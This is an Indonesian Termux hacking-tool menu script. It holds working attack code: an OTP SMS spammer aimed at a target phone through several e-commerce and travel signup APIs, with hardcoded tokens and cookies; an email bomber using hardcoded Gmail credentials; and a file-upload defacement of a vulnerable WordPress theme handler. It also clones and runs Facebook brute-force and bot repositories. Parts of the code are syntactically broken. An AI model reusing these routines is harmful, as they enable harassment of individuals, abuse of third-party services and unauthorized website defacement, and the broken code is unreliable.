#muehehehe mau recode ya?
#telaso ngotak dong anjg   
#tinggal pake aja ribet-_-
try:
    import os,sys,requests,time,json,re                      
    from time import sleep
    from requests import post
except ImportError:
    print ("\033[1;97mModule:\033[1;91mNot Installing!!")
    sleep(1)
    print ("\033[1;97mInstall module...")
    sleep(2)
    os.system("pip install mechanize requests bs4")          
    sleep(1)
    print ("\033[1;97mModule:\033[1;92mSuccess Installing..!")
def bersih():
    os.system('clear')
def balik():
    os.system("python tools.py")
def kembali():                                           
    try:
        t = input("\033[1;97mKembali? (y/t): ")
        if t == "y":
            balik()
        elif t == "t":
            sys.exit("\033[1;91mexit")
    except KeyboardInterrupt:
        sys.exit("\033[1;91mStop!\033[1;97m")
def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./250)
def botfb():
    os.system("git clone https://github.com/salismazaya/TAFA")
    os.system("mv -f TAFA ~/danz/config")
    os.system("python ~/danz/config/TAFA/run.py")
def spamer():
    def rupa():
        ua={
        "Host": "wapi.ruparupa.com",
        "Connection": "keep-alive",
        "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "X-Company-Name": "odi",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
        "user-platform": "mobile",
        "X-Frontend-Type": "mobile",
        "Origin": "https://m.ruparupa.com",
        "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        dat=json.dumps({"phone":no,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0})
        r = requests.post("https://wapi.ruparupa.com/auth/generate-otp", data=dat, headers=ua).text
        if "success" in r:
            print ("\033[1;97mSPAM \033[90m=> \033[1;92mBERHASIL")
        else:
            print ("\033[1;97mSPAM \033[90m=> \033[1;91mGAGAL")
            sys.exit("\033[1;97mLimit Gan")
    def tok():
        ua = {
        'Connection' : 'keep-alive',
        'Accept' : 'application/json, text/javascript, */*; q=0.01',
        'Origin' : 'https://accounts.tokopedia.com',
        'X-Requested-With' : 'XMLHttpRequest',
        'User-Agent' : 'Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
        'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding' : 'gzip, deflate',
        }
        site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+no+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D',headers=ua).text
        search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
        data = {
        'otp_type' : '116',
        'msisdn' : no,
        'tk' : search,
        'email' : '',
        'original_param' : '',
        'user_id' : '',
        'signature' : '',
        'number_otp_digit' : '6',
        }
        send = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=ua, data=data).text
        if "true" in send:
            print ("\033[1;97mSPAM \033[90m=> \033[1;92mBERHASIL")
        else:
            print ("\033[1;97mSPAM \033[90m=> \033[1;91mGAGAL")
            sys.exit("\033[1;97mLimit Gan")
    def mapclub():
        ua={
        "Host": "cmsapi.mapclub.com",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
        "content-type": "application/json",
        "Origin": "https://www.mapclub.com",
        "Referer": "https://www.mapclub.com/en/user/signup",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        dat=json.dumps({"phone":no})
        r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
        if "ok" in r:
            print ("\033[1;97mSPAM \033[90m=> \033[1;92mBERHASIL")
        else:
            print ("\033[1;97mSPAM \033[90m=> \033[1;91mGAGAL")
            sys.exit()
    def oyo():
        cc=0
        cc+=1
        ua={
        "Host": "identity-gateway.oyorooms.com",
        "consumer_host": "https://www.oyorooms.com",
        "accept-language": "id",
        "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "accept": "*/*",
        "origin": "https://www.oyorooms.com",
        "referer": "https://www.oyorooms.com/login",
        "Accept-Encoding": "gzip, deflate, br",
        }
        dat=json.dumps({"phone":no,"country_code":"+62","country_iso_code":"ID","nod":"4","send_otp":"true","devise_role":"Consumer_Guest"})
        r = requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", data=dat, headers=ua).text
        if "SUCCESSFULLY GENERATED OTP " in r:
            print ("\033[1;97mSPAM \033[90m=> \033[1;92mBERHASIL")
        else:
            print ("\033[1;97mSPAM \033[90m=> \033[1;91mGAGAL")
            sys.exit()
    def depop():
        ua={
        "Host": "webapi.depop.com",
        "accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        }
        dat=json.dumps({"phone_number":no,"country_code":"ID"})
        r = requests.put("https://webapi.depop.com/api/auth/v1/verify/phone", data=dat, headers=ua)
        if "8d35d527-7a0e-4871-be05-5ef5b01c9851" in r.text:
            print ("\033[1;97mSPAM \033[90m=> \033[1;92mBERHASIL")
        else:
            print ("\033[1;97mSPAM \033[90m=> \033[1;91mGAGAL")
    def soplai():
        ua={
        "Host": "api.sooplai.com",
        "accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "origin": "https://www.sooplai.com",
        "referer": "https://www.sooplai.com/register",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        }
        dat=json.dumps({"phone":no})
        r = requests.post("https://api.sooplai.com/customer/register/otp/request", data=dat, headers=ua)
        print ("\033[1;97mSPAM \033[90m=> \033[1;92mBERHASIL")
    def call():
        head = {
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
        "Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
        "Content-Type": "application/json",
        "Origin": "https://id.jagreward.com",
        "Referer": "https://id.jagreward.com/member/register/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
        "_ga": "GA1.2.2037151396.1584709855",
        "PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
        "DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
        }
        try:
            r = requests.get("https://id.jagreward.com/member/verify-mobile/"+br+"/", headers=head)   
            if "Anda telah meminta kode verifikasi melebihi batas yang diizinkan. Harap tunggu sebentar sebelum membuat permintaan kode verifikasi yang lain." in r.text:
                print ("\033[90m> \]33[1;97mSPAM \033[1;94m=> \033[1;91mGAGAL")
            else:
                print ("\033[90m> \033[1;97mSPAM \033[1;94m=> \033[1;92mBERHASIL")
    no = input("\033[1;97mNO TARGET:\033[90m<(0896×××)> \033[1;92m")
    br = input("\033[1;97mNO TARGET:\033[90m <(896×××)> \033[1;92m")
    try:
        for i in range(1):
            rupa()
        for i in range(1):
            tok()
        for i in range(1,10):
            mapclub()
        for i in range(1,2):
            depop()
        for i in range(1,5):
            soplai()
        for i in range(1):
            call()
    except requests.exceptions.ConnectionError:
           sys.exit("\033[1;91mKoneksi Error!")
def tom():
    try:
         os.mkdir('/data/data/com.termux/files/home/.termux')
    except:
         pass
    key = "extra-keys = [['ESC','/','-','HOME','UP','END','PGUP'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]"
    xmanz = open('/data/data/com.termux/files/home/.termux/termux.properties','w')
    xmanz.write(key)
    xmanz.close()
    sleep (2)
    os.system('termux-reload-settings')
    print ("\033[90m[\033[1;92m+\033[90m]\033[1;92m Success\033[1;97m")
def yagmail():
    try:
        import yagmail
    except ImportError:
        print ("\033[1;91mModule Not Installing!!")
        sleep(1)
        print ('\033[1;97mInstalling Module...')
        sleep(2)
        os.system("pip install yagmail")
        sleep(1)
        print ("\033[1;92mModule Success Installing!!")
        sleep(1)
    try:
        import yagmail
        knf=yagmail.SMTP("comunnityjapan@gmail.com","tes12345")
        mail=input("\033[1;97mEmail Target: \033[1;92m")
        subject=input("\033[1;97mYour Subject: \033[1;92m")
        body=input("\033[1;97mYour Message: \033[1;92m")
        jl=int(input("\033[1;97mLooping: \033[1;92m"))
        for i in range(jl):
            knf.send(mail,subject,body)
            print ('\033[1;97mSend To \033[90m=> \033[1;92m',mail)
    except requests.exceptions.ConnectionError:
        print ("\033[1;91mKoneksi Error!!")
        sleep(2)
        kembali()
def dfc():
    ua={
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    }
    aa="/wp-content/themes/sportime-theme/functions/upload-handler.php"
    bb=input("\033[1;97mWeb Target Vuln: \033[1;92m")
    cc=bb+aa
    try:
        dd=input("\033[1;97mScript Deface: \033[1;92m")
        deface=open(dd,"r")
        ee={
            "orange_themes":deface
            }
        gg=requests.post(cc,files=ee,headers=ua)
        print (gg.text)
    except FileNotFoundError:
           sys.exit("\033[1;91mScript Tidak ada!!")

def msp():
    try:
        print ("\033[1;94m{\033[1;97m01\033[1;94m}\033[1;96m Metasploit Android 5-6")
        print ("\033[1;94m{\033[1;97m02\033[1;94m}\033[1;96m Metasploit Android 7-10")
        print ("\033[1;94m{\033[1;97m00\033[1;94m}\033[1;96m Kembali")
        print()
        w = input("\033[1;97m> \033[1;92m")
        if w == "01" or w == "1":
           os.system("pkg install curl")
           os.system("https://raw.githubusercontent.com/Techzindia/Metasploit_For_Termux/master/metasploitTechzindia.sh")
           os.syste("sh metasploitTechzindia.sh")
        elif w == "02" or w == "2":
             os.system("pkg install root-repo")
             os.system("pkg install unstable-repo")
             os.system("pkg install x11-repo")
             os.system("pkg install metasploit")
        elif w == "00" or w == "0":
             balik()
        else:
             print ("\033[1;91mWrong Input!!")
    except KeyboardInterrupt:
           sys.exit("\033[1;91mexit")
def yt():
    try:
        os.system("pip install youtube-dl")
        os.system("apt install ffmpeg")
    except requests.exceptions.ConnectionError:
        print ("\033[1;91mKoneksi Error!!")
    print ("""
\033[1;94m{\033[1;97m01\033[1;94m}\033[1;96m Vidio Download
\033[1;94m{\033[1;97m02\033[1;94m}\033[1;96m Music Download""")
    cu = input("\033[1;97m> \033[1;92m")
    if cu == "01" or cu == "1":
       f = input("\033[1;97mLINK: \033[1;92m")
       tod = ("youtube-dl '/sdcard' "+f)
       c = os.system(tod)
       print (c)
       sleep(1)
       print ("\033[1;97m[\033[1;92m✓\033[1;97m]\033[90m-\033[1;97mDownload\033[90m-\033[1;92mSuccess\n\033[1;97m[\033[1;92mthe video is already in the sdcard folder\033[1;97m]")
    elif cu == "02" or cu == "2":
         ji = input("\033[1;97mLINK: \033[1;92m")
         su = ("youtube-dl -x --audio-format mp3 -o '/sdcard/%(title)s.%(ext)s' "+ji)
         ne = os.system(su)
         print (ne)
         sleep(1)
         print ("\033[1;97m[\033[1;92m✓\033[1;97m]\033[90m-\033[1;97mDownload\033[90m-\033[1;92mSuccess\n\033[1;97m[\033[1;92mthe music is already in the sdcard folder\033[1;97m]")
    else:
         print ("\033[1;91mWrong Input!!")
def enc():
    os.system("python2 ~/danz/config/enc.py")
def tyl():
    os.system("git clone https://github.com/BangDanz/tuyul")
    os.system("mv -f tuyul ~/danz/config")
    os.system("sh ~/danz/config/tuyul/bot.sh")
def mbf():
    os.system("git clone https://github.com/KANG-NEWBIE/s-mbf")
    os.system("mv -f s-mbf ~/danz/config")
    os.system("pip install -r ~/danz/config/s-mbf/req.txt")
    os.system("python ~/danz/config/s-mbf/embf.py")
def main():
    kata("""
    \033[90m------------------------------------
    \033[1;94m{\033[1;97m01\033[1;94m}\033[1;96m Bot Facebook
    \033[1;94m{\033[1;97m02\033[1;94m}\033[1;96m Yt Downloaders
    \033[1;94m{\033[1;97m03\033[1;94m}\033[1;96m Mbf 
    \033[1;94m{\033[1;97m04\033[1;94m}\033[1;96m Spammer
    \033[1;94m{\033[1;97m05\033[1;94m}\033[1;96m Deface Orange Themes
    \033[1;94m{\033[1;97m06\033[1;94m}\033[1;96m Encrypt Python Base64
    \033[1;94m{\033[1;97m07\033[1;94m}\033[1;96m Python Send Protocol Using Yagmail
    \033[1;94m{\033[1;97m08\033[1;94m}\033[1;96m Install Metasploit
    \033[1;94m{\033[1;97m09\033[1;94m}\033[1;96m Tombol Termux
    \033[1;94m{\033[1;97m10\033[1;94m}\033[1;96m Bot Apk Reward
    """)
    j = input("\033[1;97m> \033[1;92m")
    if j == "01" or j == "1":
       botfb()
       kembali()
    elif j == "02" or j == "2":
         yt()
         kembali()
    elif j == "03" or j == "3":
         mbf()
         kembali()
    elif j == "04" or j == "4":
         spamer()
         kembali()
    elif j == "05" or j == "5":
         dfc()
         kembali()
    elif j == "06" or j == "6":
         enc()
         kembali()
    elif j == "07" or j == "7":
         yagmail()
         kembali()
    elif j == "08" or j == "8":
         msp()
    elif j == "09" or j == "9":
         tom()
         kembali()
    elif j == "10":
         tyl()
         kembali()
    else:
       print ("\033[1;91mWrong Input!\033[1;97m")
       balik()
def login():
    try:
        bersih()
        kata("""
        \033[1;96m  <=\033[1;97mMenu Tools\033[1;96m=>

        \033[1;94m{\033[1;97m01\033[1;94m}\033[1;97m Info Tools
        \033[1;94m{\033[1;97m02\033[1;94m}\033[1;97m Go To Menu
        \033[1;94m{\033[1;97m03\033[1;94m}\033[1;97m Update Tools
        """)
        f = input("\033[1;97m> \033[1;92m")
        if f == "1" or f == "01":
            try:
                kata("""
\033[90m--------------------------------------------
\033[1;97m          INFO

\033[1;97mcreator:\033[1;92mFahmiApz
\033[1;97mYoutube:\033[1;92mApmzChannel

            \033[1;91mNOTE
\033[1;97mThis script is not made for crime,
don't buy and sell this script for everyone  free
for those who want to recode please but think:v
for pro coder free bacod :)
\033[90m--------------------------------------------""")
                time.sleep(2)
                kembali()
            except KeyboardInterrupt:
                sys.exit("\033[1;91mSTOP!!\033[1;97m")
        elif f == "02" or f == "2":
             main()
        elif f == "03" or f == "3":
             os.system("git pull")
        else:
            print ("\033[1;91mWrong Input!!\033[1;97m")
            sleep(2)
            balik()
    except KeyError:
        print ("\033[1;91mStop!\033[1;97m")
        sys.exit()
    except KeyboardInterrupt:
        print ("\033[1;91mStop!\033[1;97m")
        sys.exit()

login()
